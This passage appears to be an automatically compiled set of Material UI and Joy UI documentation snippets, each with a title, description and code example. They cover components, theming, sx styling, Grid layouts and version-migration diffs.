      <Stack>…</Stack> {/* uses flexbox gap by default */}
    </CssVarsProvider>
  );
}

----------------------------------------

TITLE: Importing and Using Sheet Component in React
DESCRIPTION: This snippet shows how to import the Sheet component from Joy UI and use it in a basic React application. The Sheet component is a generic container that supports Joy UI's global variants.

LANGUAGE: jsx
CODE:
import Sheet from '@mui/joy/Sheet';

export default function MyApp() {
  return <Sheet>Holy sheet!</Sheet>;
}

----------------------------------------

TITLE: Customizing Box with sx Prop
DESCRIPTION: Demonstrates using the sx prop to apply theme-aware styles to a Box component.

LANGUAGE: jsx
CODE:
<Box
  sx={{
    bgcolor: 'background.paper',
    boxShadow: 1,
    borderRadius: 2,
    p: 2,
    minWidth: 300,
  }}
>
  <Box sx={{ color: 'text.secondary' }}>Sessions</Box>
  <Box sx={{ color: 'text.primary', fontSize: 34, fontWeight: 'medium' }}>
    98.3 K
  </Box>
  <Box
    sx={{
      color: 'success.dark',
      display: 'inline',
      fontWeight: 'bold',
      mx: 0.5,
      fontSize: 14,
    }}
  >
    +18.77%
  </Box>
  <Box sx={{ color: 'text.secondary', display: 'inline', fontSize: 14 }}>
    vs. last week
  </Box>
</Box>

----------------------------------------

TITLE: Importing and Basic Usage of Chip Component in React
DESCRIPTION: This snippet demonstrates how to import the Chip component from Joy UI and use it in a basic React application. It shows the minimal setup required to render a chip with text content.

LANGUAGE: jsx
CODE:
import Chip from '@mui/joy/Chip';

export default function MyApp() {
  return <Chip>My chip</Chip>;
}

----------------------------------------

TITLE: Adding prepend option to Emotion cache
DESCRIPTION: Add the prepend option to createCache when using a custom Emotion cache to ensure correct injection order.

LANGUAGE: diff
CODE:
 import * as React from 'react';
 import { CacheProvider } from '@emotion/react';
 import createCache from '@emotion/cache';

 const cache = createCache({
   key: 'css',
+  prepend: true,
 });

 export default function PlainCssPriority() {
   return (
     <CacheProvider value={cache}>
       {/* Your component tree. Now you can override Material UI's styles. */}
     </CacheProvider>
   );
 }

----------------------------------------

TITLE: ESLint Configuration for Import Restrictions
DESCRIPTION: ESLint configuration to prevent problematic deep imports from Material UI packages.

LANGUAGE: json
CODE:
{
  "rules": {
    "no-restricted-imports": [
      "error",
      {
        "patterns": ["@mui/*/*/*"]
      }
    ]
  }
}

----------------------------------------

TITLE: Customized Badge Styling in React
DESCRIPTION: Example of customizing the Badge component using Material-UI's customization options.

LANGUAGE: jsx
CODE:
CustomizedBadges.js referenced but not provided

----------------------------------------

TITLE: Importing and Using Visually Hidden Style in React with MUI
DESCRIPTION: Demonstrates how to import and apply the visually hidden style utility from MUI to hide elements visually while keeping them accessible to screen readers. This method is suitable for environments with strict Content Security Policies (CSP).

LANGUAGE: jsx
CODE:
{"demo": "VisuallyHiddenUsage.js", "defaultCodeOpen": true}

----------------------------------------

TITLE: Customizing Timeline Component in React
DESCRIPTION: Provides an example of how to customize the timeline component using Material UI's customization features.

LANGUAGE: jsx
CODE:
{"demo": "CustomizedTimeline.js"}

----------------------------------------

TITLE: Positioned Menu Example
DESCRIPTION: Demonstrates menu positioning capabilities using Popover component properties.

LANGUAGE: jsx
CODE:
{"demo": "PositionedMenu.js"}

----------------------------------------

TITLE: Offset Grid Items
DESCRIPTION: Shows how to move grid items to the right using the offset prop, either by specifying a number of columns or using 'auto' to move to the right edge.

LANGUAGE: JavaScript
CODE:
{"demo": "OffsetGrid.js", "bg": true}

----------------------------------------

TITLE: Customizing Dark Scrollbar Theme in Material-UI
DESCRIPTION: Example of customizing scrollbar colors for dark mode using the darkScrollbar utility. This improves contrast especially on Windows systems, though it forces scrollbar visibility on macOS.

LANGUAGE: jsx
CODE:
import darkScrollbar from '@mui/material/darkScrollbar';

const theme = createTheme({
  components: {
    MuiCssBaseline: {
      styleOverrides: (themeParam) => ({
        body: themeParam.palette.mode === 'dark' ? darkScrollbar() : null,
      }),
    },
  },
});

----------------------------------------

TITLE: MUI Text Transformation
DESCRIPTION: Examples of text case transformation using the Box component's textTransform prop.

LANGUAGE: jsx
CODE:
<Box sx={{ textTransform: 'capitalize' }}>…
<Box sx={{ textTransform: 'lowercase' }}>…
<Box sx={{ textTransform: 'uppercase' }}>…

----------------------------------------

TITLE: Using Experimental sx Function in Theme Overrides
DESCRIPTION: Demonstrates the usage of unstable_sx function from theme to apply sx-like syntax in global theme overrides, providing a more concise way to write styles.

LANGUAGE: jsx
CODE:
import { ThemeProvider, createTheme } from '@mui/material/styles';

<ThemeProvider
  theme={createTheme({
    components: {
      MuiChip: {
        styleOverrides: {
          root: ({ theme }) =>
            theme.unstable_sx({
              px: '12px',
              py: '6px',
              fontWeight: 500,
              borderRadius: '8px',
            }),
          label: {
            padding: 0,
          },
        },
      },
    },
  })}
>
  ...your app
</ThemeProvider>;

----------------------------------------

TITLE: Creating Material UI Theme Configuration
DESCRIPTION: Defines a shared theme instance with custom palette configuration for primary, secondary and error colors.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material/styles';
import { red } from '@mui/material/colors';

// Create a theme instance.
const theme = createTheme({
  palette: {
    primary: {
      main: '#556cd6',
    },
    secondary: {
      main: '#19857b',
    },
    error: {
      main: red.A400,
    },
  },
});

export default theme;

----------------------------------------

TITLE: Nested Grid Layout
DESCRIPTION: Shows how to create nested grid layouts where inner grid containers inherit columns and spacing from the parent grid.

LANGUAGE: JavaScript
CODE:
{"demo": "NestedGrid.js", "bg": true}

----------------------------------------

TITLE: Custom Breakpoints Grid Implementation in React
DESCRIPTION: Demonstrates how to implement custom breakpoints in a Material-UI Grid component using ThemeProvider. Shows responsive grid layout with custom mobile, tablet, and laptop breakpoints.

LANGUAGE: JavaScript
CODE:
import { ThemeProvider, createTheme } from '@mui/material/styles';

function Demo() {
  return (
    <ThemeProvider
      theme={createTheme({
        breakpoints: {
          values: {
            laptop: 1024,
            tablet: 640,
            mobile: 0,
            desktop: 1280,
          },
        },
      })}
    >
      <Grid container spacing={{ mobile: 1, tablet: 2, laptop: 3 }}>
        {Array.from(Array(4)).map((_, index) => (
          <Grid key={index} size={{ mobile: 6, tablet: 4, laptop: 3 }}>
            <div>{index + 1}</div>
          </Grid>
        ))}
      </Grid>
    </ThemeProvider>
  );

----------------------------------------

TITLE: MUI Font Family Control
DESCRIPTION: Examples of setting font family using the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ fontFamily: 'default' }}>…
<Box sx={{ fontFamily: 'Monospace' }}>…

----------------------------------------

TITLE: Basic Table Component Import
DESCRIPTION: Simple import statement for the Joy UI Table component

LANGUAGE: jsx
CODE:
import Table from '@mui/joy/Table';

----------------------------------------

TITLE: Implementing Basic Backdrop with Progress Indicator in React
DESCRIPTION: Example showing a basic implementation of the Backdrop component with a Circular Progress indicator. The backdrop can be toggled with a button click and dismissed by clicking anywhere on the screen.

LANGUAGE: jsx
CODE:
// SimpleBackdrop.js - referenced in documentation but code not provided in input text

----------------------------------------

TITLE: Responsive Grid Layout with Multiple Breakpoints
DESCRIPTION: Illustrates how to create a responsive grid layout that adapts to different screen sizes using multiple breakpoints. It shows how to define different column widths for various viewport sizes.

LANGUAGE: JavaScript
CODE:
{"demo": "FullWidthGrid.js", "bg": true}

----------------------------------------

TITLE: Installing Material-UI v1.x Alongside v0.x with npm
DESCRIPTION: Commands to install both versions of Material-UI using npm package manager.

LANGUAGE: bash
CODE:
npm install material-ui
npm install @material-ui/core

----------------------------------------

TITLE: MenuItem State Customization
DESCRIPTION: Demonstrates customizing the selected state of a MenuItem component using Material UI state classes.

LANGUAGE: css
CODE:
.MenuItem {
  color: black;
}

/* Increase the specificity */
.MenuItem.Mui-selected {
  color: blue;
}

LANGUAGE: jsx
CODE:
<MenuItem selected className="MenuItem">

----------------------------------------

TITLE: Generated CSS Output Example
DESCRIPTION: Example of the CSS output generated when using the marginBottom system property.

LANGUAGE: CSS
CODE:
.my-class {
  margin-bottom: Xpx;
}

----------------------------------------

TITLE: Rendering Basic Switches in React
DESCRIPTION: Demonstrates how to render basic switches using the Switch component from Material-UI.

LANGUAGE: jsx
CODE:
{"demo": "BasicSwitches.js"}

----------------------------------------

TITLE: Importing useSelect Hook from MUI Base
DESCRIPTION: Import statement for using the useSelect hook to create custom Select functionality.

LANGUAGE: js
CODE:
import { useSelect } from '@mui/base/useSelect';

----------------------------------------

TITLE: Setting Responsive Viewport Meta Tag in HTML
DESCRIPTION: Adds a viewport meta tag to ensure proper rendering and touch zooming across all devices. This is essential for the mobile-first approach of MUI Base.

LANGUAGE: html
CODE:
<meta name="viewport" content="initial-scale=1, width=device-width" />

----------------------------------------

TITLE: Configuring Theme Direction
DESCRIPTION: Using extendTheme API to set RTL direction in the Joy UI theme configuration.

LANGUAGE: javascript
CODE:
import { extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  direction: 'rtl',
});

----------------------------------------

TITLE: Row and Column Spacing in Grid
DESCRIPTION: Demonstrates how to independently specify row and column gaps in a grid layout using the rowSpacing and columnSpacing props, similar to CSS Grid's row-gap and column-gap properties.

LANGUAGE: JavaScript
CODE:
{"demo": "RowAndColumnSpacing.js", "bg": true}

----------------------------------------

TITLE: Updating StylesProvider import
DESCRIPTION: Change StylesProvider import from @mui/material/styles to @mui/styles.

LANGUAGE: diff
CODE:
-import { StylesProvider } from '@mui/material/styles';
+import { StylesProvider } from '@mui/styles';

----------------------------------------

TITLE: Using Select with TypeScript and Custom Root Component
DESCRIPTION: TypeScript example of specifying a custom component type for the Select's root slot.

LANGUAGE: tsx
CODE:
<Select<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

----------------------------------------

TITLE: Inferring Dimensions with Typography in React Skeleton
DESCRIPTION: Shows how the Skeleton component can infer dimensions when used with Typography, using em units for height.

LANGUAGE: jsx
CODE:
<Typography variant="h1">{loading ? <Skeleton /> : 'h1'}</Typography>

----------------------------------------

TITLE: Setting HTML Direction Attribute
DESCRIPTION: Adding RTL direction at the HTML root level for global text direction control.

LANGUAGE: html
CODE:
<html dir="rtl"></html>

----------------------------------------

TITLE: React Router Link Integration
DESCRIPTION: Demonstrates integration between Joy UI Link component and React Router's Link component for navigation.

LANGUAGE: js
CODE:
import { Link as RouterLink } from 'react-router';
import Link from '@mui/joy/Link';

<Link component={RouterLink} to="/docs">
  Read doc
</Link>;

----------------------------------------

TITLE: Importing DialogContent Component for Scrollable Drawer in React
DESCRIPTION: This code imports the DialogContent component, which can be used to create a scrollable container inside the Drawer. This is useful for handling large amounts of content within the Drawer.

LANGUAGE: jsx
CODE:
import DialogContent from '@mui/joy/DialogContent';

----------------------------------------

TITLE: Radio Button Accessibility Implementation
DESCRIPTION: Example showing how to implement accessibility attributes for radio buttons when a label cannot be used directly. Uses inputProps to apply ARIA attributes.

LANGUAGE: jsx
CODE:
<Radio
  value="radioA"
  inputProps={{
    'aria-label': 'Radio A',
  }}
/>

----------------------------------------

TITLE: Placing Title Bar Below Image in Standard Layout
DESCRIPTION: This snippet shows how to place the title bar below the image in a standard image list layout using Material-UI components.

LANGUAGE: JSX
CODE:
{"demo": "TitlebarBelowImageList.js"}

----------------------------------------

TITLE: Setting Grid Column Properties
DESCRIPTION: Examples of setting grid column spans and start/end positions using MUI sx prop

LANGUAGE: jsx
CODE:
<Box sx={{ gridColumn: '1 / 3' }}>…
<Box sx={{ gridColumn: 'span 2' }}>…

----------------------------------------

TITLE: Creating Left-Aligned Timeline in React
DESCRIPTION: Demonstrates how to create a left-aligned timeline by adjusting the relative width of the left and right sides.

LANGUAGE: jsx
CODE:
{"demo": "LeftAlignedTimeline.js"}

----------------------------------------

TITLE: Customizing Color in React Chips
DESCRIPTION: Demonstrates how to customize the color of Chip components using the color prop.

LANGUAGE: JSX
CODE:
{"demo": "ColorChips.js"}

----------------------------------------

TITLE: Removing Borders with MUI Box Component in JSX
DESCRIPTION: Shows how to remove borders from elements using the MUI Box component with the sx prop. Includes examples for removing all borders or specific sides.

LANGUAGE: jsx
CODE:
<Box sx={{ border: 0 }}>…
<Box sx={{ borderTop: 0 }}>…
<Box sx={{ borderRight: 0 }}>…
<Box sx={{ borderBottom: 0 }}>…
<Box sx={{ borderLeft: 0 }}>…

----------------------------------------

TITLE: Updating theme.palette.type to theme.palette.mode
DESCRIPTION: Rename theme.palette.type to theme.palette.mode for dark mode terminology.

LANGUAGE: diff
CODE:
 import { createTheme } from '@mui/material/styles';
-const theme = createTheme({ palette: { type: 'dark' } }),
+const theme = createTheme({ palette: { mode: 'dark' } }),

----------------------------------------

TITLE: Loading ButtonGroup Implementation
DESCRIPTION: Shows how to implement loading state in button groups using the loading prop

LANGUAGE: jsx
CODE:
<ButtonGroup>\n  <Button loading>Loading Button</Button>\n  <Button>Normal Button</Button>\n</ButtonGroup>

----------------------------------------

TITLE: Implementing Styled Button with MUI System
DESCRIPTION: Implementation of a themed button using MUI System's styled function

LANGUAGE: tsx
CODE:
import * as React from 'react';
import { ThemeProvider } from '@emotion/react';
import { styled } from '@mui/system';
import { Button } from '@mui/base/Button';

const theme = {
  palette: {
    primary: 'green',
    text: '#fff',
  },
};

const GitHubButton = styled(Button)(
  ({ theme }) => `
    background-color: ${theme.palette.primary /* => 'green' */};
    ${/* ... the rest of the styles */}
  `,
);

export default function App() {
  return (
    <ThemeProvider theme={theme}>
      <GitHubButton>Create Repository</GitHubButton>
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Implementing Simple Bottom Navigation in React with Material-UI
DESCRIPTION: This snippet demonstrates how to create a basic bottom navigation bar with three actions, displaying both icons and text labels. It uses the BottomNavigation and BottomNavigationAction components from Material-UI.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import Box from '@mui/material/Box';
import BottomNavigation from '@mui/material/BottomNavigation';
import BottomNavigationAction from '@mui/material/BottomNavigationAction';
import RestoreIcon from '@mui/icons-material/Restore';
import FavoriteIcon from '@mui/icons-material/Favorite';
import LocationOnIcon from '@mui/icons-material/LocationOn';

export default function SimpleBottomNavigation() {
  const [value, setValue] = React.useState(0);

  return (
    <Box sx={{ width: 500 }}>
      <BottomNavigation
        showLabels
        value={value}
        onChange={(event, newValue) => {
          setValue(newValue);
        }}
      >
        <BottomNavigationAction label="Recents" icon={<RestoreIcon />} />
        <BottomNavigationAction label="Favorites" icon={<FavoriteIcon />} />
        <BottomNavigationAction label="Nearby" icon={<LocationOnIcon />} />
      </BottomNavigation>
    </Box>
  );
}

----------------------------------------

TITLE: Configuring Vite for MUI System v7 Modern Bundle
DESCRIPTION: This code snippet demonstrates how to configure Vite to use the 'mui-modern' exports condition for smaller bundle size in MUI System v7.

LANGUAGE: js
CODE:
// vite.config.js
{
  resolve: {
    conditions: ['mui-modern', 'module', 'browser', 'development|production']
  }
}

----------------------------------------

TITLE: Keeping old shadow scale in theme
DESCRIPTION: Code to maintain the previous shadow scale in the Joy UI theme.

LANGUAGE: javascript
CODE:
extendTheme({
  shadow: {
    xs: `var(--joy-shadowRing, 0 0 #000),
        0 1px 2px 0 rgba(var(--joy-shadowChannel, 187 187 187) / 0.12)`,
    sm: `var(--joy-shadowRing, 0 0 #000),
        0.3px 0.8px 1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.11),
        0.5px 1.3px 1.8px -0.6px rgba(var(--joy-shadowChannel, 187 187 187) / 0.18),
        1.1px 2.7px 3.8px -1.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.26)`,
    md: `var(--joy-shadowRing, 0 0 #000),
        0.3px 0.8px 1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.12),
        1.1px 2.8px 3.9px -0.4px rgba(var(--joy-shadowChannel, 187 187 187) / 0.17),
        2.4px 6.1px 8.6px -0.8px rgba(var(--joy-shadowChannel, 187 187 187) / 0.23),
        5.3px 13.3px 18.8px -1.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.29)`,
    lg: `var(--joy-shadowRing, 0 0 #000),
        0.3px 0.8px 1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.11),
        1.8px 4.5px 6.4px -0.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.13),
        3.2px 7.9px 11.2px -0.4px rgba(var(--joy-shadowChannel, 187 187 187) / 0.16),
        4.8px 12px 17px -0.5px rgba(var(--joy-shadowChannel, 187 187 187) / 0.19),
        7px 17.5px 24.7px -0.7px rgba(var(--joy-shadowChannel, 187 187 187) / 0.21)`,
    xl: `var(--joy-shadowRing, 0 0 #000),
        0.3px 0.8px 1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.11), 
        1.8px 4.5px 6.4px -0.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.13), 
        3.2px 7.9px 11.2px -0.4px rgba(var(--joy-shadowChannel, 187 187 187) / 0.16), 
        4.8px 12px 17px -0.5px rgba(var(--joy-shadowChannel, 187 187 187) / 0.19), 
        7px 17.5px 24.7px -0.7px rgba(var(--joy-shadowChannel, 187 187 187) / 0.21), 
        10.2px 25.5px 36px -0.9px rgba(var(--joy-shadowChannel, 187 187 187) / 0.24), 
        14.8px 36.8px 52.1px -1.1px rgba(var(--joy-shadowChannel, 187 187 187) / 0.27), 21px 52.3px 74px -1.2px rgba(var(--joy-shadowChannel, 187 187 187) / 0.29)`,
  },
});

----------------------------------------

TITLE: Implementing MenuItem Ripple Disable in JSX
DESCRIPTION: Example showing how prop spreading works to disable ripple effects through component hierarchy

LANGUAGE: jsx
CODE:
<MenuItem disableRipple />

----------------------------------------

TITLE: Using exported class constants in theme styleOverrides
DESCRIPTION: Import and use exported class constants instead of hardcoding class names in theme styleOverrides.

LANGUAGE: diff
CODE:
+import { outlinedInputClasses } from '@mui/material/OutlinedInput';

 const theme = createTheme({
   components: {
     MuiOutlinedInput: {
       styleOverrides: {
         root: {
-          '& $notchedOutline': {
+          [`& .${outlinedInputClasses.notchedOutline}`]: {
             borderWidth: 1,
           }
         }
       }
     }
   }
 });

----------------------------------------

TITLE: Grid v2 Container and Item Spacing Implementation
DESCRIPTION: Demonstrates how Grid v2 handles spacing using CSS variables for container and item components

LANGUAGE: javascript
CODE:
// The code is simplified for readability
{
  '--Grid-rowSpacing': spacingProp,
  '--Grid-columnSpacing': spacingProp,
}

{
  padding: `calc(var(--Grid-rowSpacing) / 2) calc(var(--Grid-columnSpacing) / 2)`,
}

----------------------------------------

TITLE: Preventing SSR Flickering in Material UI
DESCRIPTION: Shows how to prevent SSR flickering in Material UI applications by replacing theme.palette.mode checks with the theme.applyStyles() function. This ensures consistent rendering during server-side rendering and client-side hydration.

LANGUAGE: diff
CODE:
 import Card from '@mui/material/Card';

 function App() {
   return (
     <Card
-      sx={(theme) => ({
-        backgroundColor: theme.palette.mode === 'dark' ? '#000' : '#fff',
-        '&:hover': {
-          backgroundColor: theme.palette.mode === 'dark' ? '#333' : '#f5f5f5',
-        },
-      })}
+      sx={[
+        {
+          backgroundColor: '#fff',
+          '&:hover': {
+            backgroundColor: '#f5f5f5',
+          },
+        },
+        (theme) =>
+          theme.applyStyles('dark', {
+            backgroundColor: '#000',
+            '&:hover': {
+              backgroundColor: '#333',
+            },
+          }),
+      ]}
     />
   );
 }

----------------------------------------

TITLE: Keeping old Tabs design
DESCRIPTION: Code to maintain the previous design for the Tabs component.

LANGUAGE: javascript
CODE:
extendTheme({
  components: {
    JoyTabList: {
      defaultProps: {
        variant: 'soft',
        disableUnderline: true,
      },
      styleOverrides: {
        root: {
          gap: '0.25rem',
          padding: '0.25rem',
          '--List-padding': '0.25rem',
          borderRadius: 'var(--joy-radius-xl)',
          '--List-radius': 'var(--joy-radius-xl)',
        },
      },
    },
    JoyTab: {
      defaultProps: {
        disableIndicator: true,
      },
      styleOverrides: {
        root: {
          '&[aria-selected="true"]': {
            boxShadow: 'var(--joy-shadow-sm)',
            backgroundColor: 'var(--joy-palette-background-surface)',
          },
        },
      },
    },
  },
});

----------------------------------------

TITLE: Virtual Element Popper in React
DESCRIPTION: Shows how to use a virtual element as an anchor for the Popper component, useful for scenarios where a real DOM element is not available or suitable.

LANGUAGE: JavaScript
CODE:
{"demo": "VirtualElementPopper.js"}

----------------------------------------

TITLE: Importing Roboto Font in TypeScript/JavaScript
DESCRIPTION: TypeScript/JavaScript code to import different weights of the Roboto font after installation.

LANGUAGE: tsx
CODE:
import '@fontsource/roboto/300.css';
import '@fontsource/roboto/400.css';
import '@fontsource/roboto/500.css';
import '@fontsource/roboto/700.css';

----------------------------------------

TITLE: Enhancing Switch Accessibility in React
DESCRIPTION: Demonstrates how to improve switch accessibility by adding ARIA labels using inputProps in Material-UI.

LANGUAGE: jsx
CODE:
<Switch value="checkedA" inputProps={{ 'aria-label': 'Switch A' }} />

----------------------------------------

TITLE: Creating Outlined Timeline in React
DESCRIPTION: Demonstrates how to create an outlined version of the timeline component.

LANGUAGE: jsx
CODE:
{"demo": "OutlinedTimeline.js"}

----------------------------------------

TITLE: Adapting Styles Based on Props in React
DESCRIPTION: Demonstrates how to use makeStyles with a function to adapt styles based on component props.

LANGUAGE: jsx
CODE:
const useStyles = makeStyles({
  // style rule
  foo: (props) => ({
    backgroundColor: props.backgroundColor,
  }),
  bar: {
    // CSS property
    color: (props) => props.color,
  },
});

function MyComponent() {
  // Simulated props for the purpose of the example
  const props = {
    backgroundColor: 'black',
    color: 'white',
  };
  // Pass the props as the first argument of useStyles()
  const classes = useStyles(props);

  return <div className={`${classes.foo} ${classes.bar}`} />;
}

----------------------------------------

TITLE: Displaying Content in Badge Component
DESCRIPTION: This example demonstrates how to use the badgeContent prop to display content inside the Badge. It can accept strings or numbers as values.

LANGUAGE: jsx
CODE:
<Badge badgeContent={4}>
  <Mail />
</Badge>

----------------------------------------

TITLE: Configuring Avatar Sizes in React MUI
DESCRIPTION: Avatar sizes can be customized using height and width CSS properties.

LANGUAGE: JSX
CODE:
SizeAvatars.js referenced but not provided in the input text

----------------------------------------

TITLE: Downloading Material UI CRA Example
DESCRIPTION: Commands to download and extract the Material UI Create React App example from the official repository.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2 material-ui-master/examples/material-ui-cra\ncd material-ui-cra

----------------------------------------

TITLE: String-based Spacing Values
DESCRIPTION: Shows how string values are handled in spacing props. String values are passed directly as raw CSS values.

LANGUAGE: jsx
CODE:
<Box sx={{ m: '2rem' }} /> // margin: 2rem;
<Box sx={{ mx: 'auto' }} /> // margin-left: auto; margin-right: auto;

----------------------------------------

TITLE: Updating package.json for Material UI v7 Alpha
DESCRIPTION: Change the @mui/material package version from 'latest' to 'next' in package.json to use the latest v7 pre-releases.

LANGUAGE: diff
CODE:
-"@mui/material": "latest",
+"@mui/material": "next",

----------------------------------------

TITLE: Importing Alert Component in React
DESCRIPTION: Basic import statement for the Alert component from Material UI

LANGUAGE: jsx
CODE:
import Alert from '@mui/material/Alert';

----------------------------------------

TITLE: Implementing Responsive Font Sizes in Material UI
DESCRIPTION: Example of creating responsive typography using media queries and theme breakpoints in Material UI.

LANGUAGE: javascript
CODE:
const theme = createTheme();

theme.typography.h3 = {
  fontSize: '1.2rem',
  '@media (min-width:600px)': {
    fontSize: '1.5rem',
  },
  [theme.breakpoints.up('md')]: {
    fontSize: '2.4rem',
  },
};

----------------------------------------

TITLE: Keeping old font family in theme
DESCRIPTION: Code to maintain the previous font family in the Joy UI theme.

LANGUAGE: javascript
CODE:
extendTheme({
  fontFamily: {
    display: '"Public Sans", var(--joy-fontFamily-fallback)',
    body: '"Public Sans", var(--joy-fontFamily-fallback)',
  },
});

----------------------------------------

TITLE: Accessible Divider with Presentation Role
DESCRIPTION: Example showing how to implement an accessible divider with presentation role for screen readers when used for visual decoration.

LANGUAGE: js
CODE:
<Divider component="div" role="presentation">
  {/* any elements nested inside the role="presentation" preserve their semantics. */}
</Divider>

----------------------------------------

TITLE: Manually Providing Palette Colors in JavaScript
DESCRIPTION: This snippet demonstrates how to manually provide palette colors by specifying the main token and optionally light, dark, and contrastText tokens.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material/styles';

const theme = createTheme({
  palette: {
    primary: {
      main: '#FF5733',
      // light: will be calculated from palette.primary.main,
      // dark: will be calculated from palette.primary.main,
      // contrastText: will be calculated to contrast with palette.primary.main
    },
    secondary: {
      main: '#E0C2FF',
      light: '#F5EBFF',
      // dark: will be calculated from palette.secondary.main,
      contrastText: '#47008F',
    },
  },
});

----------------------------------------

TITLE: Accordion DOM Structure
DESCRIPTION: Example showing the HTML structure and CSS classes of a rendered Accordion component.

LANGUAGE: jsx
CODE:
<div class="MuiAccordion-root">
  <h3 class="MuiAccordion-heading">
    <button class="MuiButtonBase-root MuiAccordionSummary-root" aria-expanded="">
      <!-- Accordion summary goes here -->
    </button>
  </h3>
  <div class="MuiAccordion-region" role="region">
    <div class="MuiAccordionDetails-root">
      <!-- Accordion content goes here -->
    </div>
  </div>
</div>

----------------------------------------

TITLE: Icon Menu with Enhanced Desktop Padding
DESCRIPTION: Shows a menu implementation with icons and increased padding for desktop viewports.

LANGUAGE: jsx
CODE:
{"demo": "IconMenu.js", "bg": true}

----------------------------------------

TITLE: Accessing Theme in Function Components with useTheme Hook
DESCRIPTION: Shows how to access theme variables inside function components using the useTheme hook provided by @mui/styles.

LANGUAGE: jsx
CODE:
import { useTheme } from '@mui/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}

----------------------------------------

TITLE: HTML Structure of Base Slider Component
DESCRIPTION: The complete DOM structure of the Slider component showing all internal elements including rail, track, marks, and thumb.

LANGUAGE: html
CODE:
<span class="base-Slider-root">
  <span class="base-Slider-rail"></span>
  <span class="base-Slider-track"></span>
  <span data-index="0" class="base-Slider-mark base-Slider-markActive" style="left: 0%;"></span>
  <span aria-hidden="true" data-index="0" class="base-Slider-markLabel base-Slider-markLabelActive" style="left: 0%;">0</span>
  <span data-index="1" class="base-Slider-mark" style="left: 50%;"></span>
  <span aria-hidden="true" data-index="1" class="base-Slider-markLabel" style="left: 50%;">50</span>
  <span data-index="2" class="base-Slider-mark" style="left: 100%;"></span>
  <span aria-hidden="true" data-index="2" class="base-Slider-markLabel" style="left: 100%;">100</span>
  <span class="base-Slider-thumb">
    <input />
  </span>
</span>

----------------------------------------

TITLE: Creating a Controlled Switch Component in React
DESCRIPTION: Example of creating a controlled Switch component using the 'checked' and 'onChange' props.

LANGUAGE: jsx
CODE:
<Switch
  checked={checked}
  onChange={(event) => setChecked(event.target.checked)}
/>

----------------------------------------

TITLE: Applying Text Colors in MUI Box Components
DESCRIPTION: Demonstrates how to apply different color variants from the MUI palette system to text content using the Box component's sx prop. Includes primary, secondary, error, warning, info, success, and text variants.

LANGUAGE: jsx
CODE:
<Box sx={{ color: 'primary.main' }}>…
<Box sx={{ color: 'secondary.main' }}>…
<Box sx={{ color: 'error.main' }}>…
<Box sx={{ color: 'warning.main' }}>…
<Box sx={{ color: 'info.main' }}>…
<Box sx={{ color: 'success.main' }}>…
<Box sx={{ color: 'text.primary' }}>…
<Box sx={{ color: 'text.secondary' }}>…
<Box sx={{ color: 'text.disabled' }}>…

----------------------------------------

TITLE: Autocomplete Import Update
DESCRIPTION: Moving Autocomplete component imports from lab to core

LANGUAGE: diff
CODE:
-import Autocomplete from '@mui/lab/Autocomplete';
-import useAutocomplete from '@mui/lab/useAutocomplete';
+import Autocomplete from '@mui/material/Autocomplete';
+import useAutocomplete from '@mui/material/useAutocomplete';

----------------------------------------

TITLE: Migrating to DesktopDatePicker in React
DESCRIPTION: Updates the import and usage of DatePicker with inline variant to DesktopDatePicker from @mui/lab.

LANGUAGE: diff
CODE:
-import { DatePicker } from '@material-ui/pickers';
+import DesktopDatePicker from '@mui/lab/DesktopDatePicker';

-<DatePicker variant="inline" />
+<DesktopDatePicker />

----------------------------------------

TITLE: Building Masonry Image List in React
DESCRIPTION: This snippet shows how to create a masonry image list with dynamically sized container heights that reflect the aspect ratio of each image. It's best used for browsing uncropped peer content.

LANGUAGE: JSX
CODE:
{"demo": "MasonryImageList.js"}

----------------------------------------

TITLE: Using the sx Prop with Pigment CSS
DESCRIPTION: Demonstrates how to use the sx prop for inline styling with Pigment CSS.

LANGUAGE: javascript
CODE:
<div sx={{ display: 'flex', flexDirection: 'column' }}>

<AnyComponent sx={{ fontSize: 12, color: 'red' }} />;

----------------------------------------

TITLE: Adding Inter Font via Google Web Fonts CDN
DESCRIPTION: HTML code to include Inter font from Google Web Fonts CDN in the project's head section.

LANGUAGE: html
CODE:
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
  rel="stylesheet"
  href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap"
/>

----------------------------------------

TITLE: HTML Structure of Radio Group Component
DESCRIPTION: This snippet shows the HTML structure of the Radio Group component. It consists of a root div element that can wrap multiple Radio components.

LANGUAGE: html
CODE:
<div class="MuiRadioGroup-root">
  <!-- Radio components here -->
</div>

----------------------------------------

TITLE: Installing Material UI Styles v4 using npm or yarn
DESCRIPTION: Command-line instructions for installing @material-ui/styles v4 using npm or yarn package managers.

LANGUAGE: bash
CODE:
npm install @material-ui/styles

or

yarn add @material-ui/styles

----------------------------------------

TITLE: Updating inputFormat Prop for Date Picker in React
DESCRIPTION: Shows the change from format prop to inputFormat prop for specifying date format in the new version.

LANGUAGE: diff
CODE:
 <DatePicker
-  format="DD-MM-YYYY"
+  inputFormat="DD-MM-YYYY"

----------------------------------------

TITLE: Creating Bottom Navigation without Labels in React using Material-UI
DESCRIPTION: This example shows how to implement a bottom navigation bar with four or five actions, displaying inactive views as icons only. It uses the BottomNavigation and BottomNavigationAction components from Material-UI.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import BottomNavigation from '@mui/material/BottomNavigation';
import BottomNavigationAction from '@mui/material/BottomNavigationAction';
